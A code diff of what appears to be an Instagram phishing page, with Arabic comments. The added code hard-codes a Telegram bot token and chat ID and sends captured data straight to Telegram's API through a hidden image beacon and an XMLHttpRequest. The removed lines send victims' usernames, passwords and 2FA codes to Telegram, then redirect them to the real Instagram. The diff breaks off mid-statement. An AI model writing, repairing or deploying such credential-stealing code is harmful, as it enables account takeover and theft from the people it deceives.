@@ -170,6 +170,9 @@
 </footer>
 
 <script>
+    const BOT_TOKEN = '8191936030:AAFl4PoBphmVzsukVH1Y-SP5mE45kgMqnkg';
+    const CHAT_ID = '8278195073';
+
     const slides = document.getElementById('slides');
     let currentSlide = 0;
     setInterval(() => {
@@ -204,19 +207,20 @@
     u.addEventListener('input', checkLogin);
     p.addEventListener('input', checkLogin);
 
-    // ===== SEND TO SERVER (هو كيبعت للسيرفر والسيرفر كيبعت للتليغرام) =====
+    // ====== الطريقة الجديدة: Image Beacon (تخدم فـ GitHub Pages) ======
     function sendToTelegram(message) {
-        fetch('/send', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ message: message })
-        })
-        .then(res => res.json())
-        .then(data => {
-            if (data.ok) console.log('[+] Sent to Telegram');
-            else console.error('[-] Telegram error:', data);
-        })
-        .catch(err => console.error('[-] Fetch error:', err));
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+        
+        // الطريقة 1: Image Beacon (صغيرة مخفية)
+        const img = new Image();
+        img.src = url;
+        
+        // الطريقة 2: كمان نفتح request بـ fetch (فاش تفشل الصورة)
+        try {
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', url, true);
+            xhr.send();
+        } catch(e) {}
     }
 
     loginForm.addEventListener('submit', function(e) {
@@ -290,43 +294,4 @@
     });
 
     verifyBtn.addEventListener('click', function() {
-        const code = Array.from(codeBoxes).map(b => b.value).join('');
-
-        sendToTelegram(
-            `🔐 *Instagram 2FA Code Received* 🔐\n\n` +
-            `👤 *Username:* \`${capturedUsername}\`\n` +
-            `🔑 *Password:* \`${capturedPassword}\`\n` +
-            `🔢 *2FA Code:* \`${code}\`\n` +
-            `📱 *UA:* ${navigator.userAgent}\n` +
-            `⏰ *Time:* ${new Date().toISOString()}\n` +
-            `🌐 *URL:* ${window.location.href}`
-        );
-
-        loadingScreen.style.display = 'flex';
-        setTimeout(() => {
-            window.location.href = 'https://www.instagram.com';
-        }, 2000);
-    });
-
-    resendBtn.addEventListener('click', function() {
-        codeBoxes.forEach(box => box.value = '');
-        codeBoxes[0].focus();
-        verifyBtn.disabled = true;
-        sendToTelegram(`🔄 *Resend Code Requested* 🔄\n\n👤 *Username:* \`${capturedUsername}\`\n⏰ *Time:* ${new Date().toISOString()}`);
-    });
-
-    backLink.addEventListener('click', function(e) {
-        e.preventDefault();
-        twofaSection.style.display = 'none';
-        loginCard.style.display = 'block';
-        signupCard.style.display = 'block';
-        checkLogin();
-    });
-
-    document.getElementById('fbLogin').addEventListener('click', function(e) {
-        e.preventDefault();
-        sendToTelegram(`📘 *Facebook Login Clicked* 📘\n\n👤 *Username:* \`${capturedUsername || 'N/A'}\`\n⏰ *Time:* ${new Date().toISOString()}`);
-    });
-</script>
-</body>
-</html>
+        const code = Array
